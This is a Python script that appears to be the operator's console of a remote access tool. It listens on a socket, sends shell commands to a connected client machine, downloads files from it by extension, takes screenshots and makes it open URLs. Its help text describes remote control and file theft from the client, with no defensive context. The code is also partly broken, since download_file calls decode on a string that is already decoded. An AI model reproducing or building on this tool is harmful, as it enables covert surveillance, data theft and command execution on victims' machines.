import socket
import os
import re
import time



downlodable_files=[
   ".jpg",
   ".pdf",
   ".png",
   ".db",
   ".jpeg",
   ".ppt",
   ".docx",
   ".jpeg",
   ".gif",
   ".txt",
   ".py"
]

valid_commands = [
   "ls", 
   "df", 
   "pwd", 
   "ipconfig",
   "ifconfig",
   "cat" , 
   "cd" , 
   "cd ..",
   "mkdir",
   "rm",
   "touch",
   "dir",
   "history",
   "mv",
   "cp",
   "stat",
   "kill",
   "whoami",
   "sc",
   "head",
   "tail"
   ]


help=f'''
valid commands: {valid_commands}
ex:[command]

take scrrenshot:it take scrrenshot of client machine
ex:[sc]

Valid_downlodable ext: {downlodable_files}

download_file: directly put the path of file it will download it from client 
ex:[x/y/z/filename.txt]

url: direct put url it will open url in client machine automatic
ex:[https://chat.openai.com]

url_file: direct put url if file linked with url it will auotmatically download that file in client server 
ex:[https://www.africau.edu/images/default/sample.pdf]

End the connenction:"exit","end","close"
ex:[end] 
it will close the connection from client..
'''
size=1034
def get_from_socket(conn):
   data = conn.recv(size).decode()#recieve_input
   data=data.split('*')#get the filename and filesize
   filename,filesize=data[0],data[1]# declare it to variable
   print(f'[+]Command={filename} size:={filesize}')
   output=conn.recv(int(filesize))#recieve all data
   print(output.decode())#print the output you get

def download_file(conn,inp):
   if any(inp.decode().endswith(extension) for extension in downlodable_files):
      data = conn.recv(size).decode()#recieve_input
      data=data.split('*')#get the filename and filesize
      filename,filesize=data[0],data[1]# declare it to variable
      print(f"[-]Name:{filename},size:{filesize}")
      
      if filename!="False":
         with open(filename,'wb') as f:
            print('[-]receiving..')
            received_bytes=0
            while received_bytes < int(filesize):
               data=conn.recv(1204)
               if not data:
                  break 
               f.write(data)
               received_bytes+= len(data)  
            print(f"Received {received_bytes} bytes for {filename}")
            print(os.path.getsize(filename))
            print("[+]Done..")
            time.sleep(2) 
      else:
         data = conn.recv(int(filesize)).decode()
         print(f"[*]{data}")
   else:
      get_from_socket(conn)

   
def is_valid_file_name(file_name):
   file_path_regex = re.compile(r'^([a-zA-Z0-9_\-\.\/]+\/)?[a-zA-Z0-9_\-\.]+\.[a-zA-Z0-9]+$')
   return bool(file_path_regex.match(file_name))

def end_connection(conn):
   print("[-]Connection ended...")
   conn.close()
   exit()

if __name__=='__main__':
   PORT = 8989
   HOST=socket.gethostname()
   #HOST=open("ip.txt","r").read()
   with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.bind((HOST, PORT))
      s.listen()
      conn, addr = s.accept()
      with conn:
         #print(f"Connected by {addr}")
         print(f"[*]connection established..")
         while True:
            inp=input('Enter_Command:').strip().encode()#take input
            
            if len(inp.decode())>0:
               #send_input
               conn.send(inp)
               
            else:
               print(help)
               continue
               
            if inp.decode()=="end" or inp.decode()=="exit" or inp.decode()=="close":
               end_connection(conn)
            
            elif is_valid_file_name(inp.decode()):
               download_file(conn,inp.decode())
            
            else:
               get_from_socket(conn)

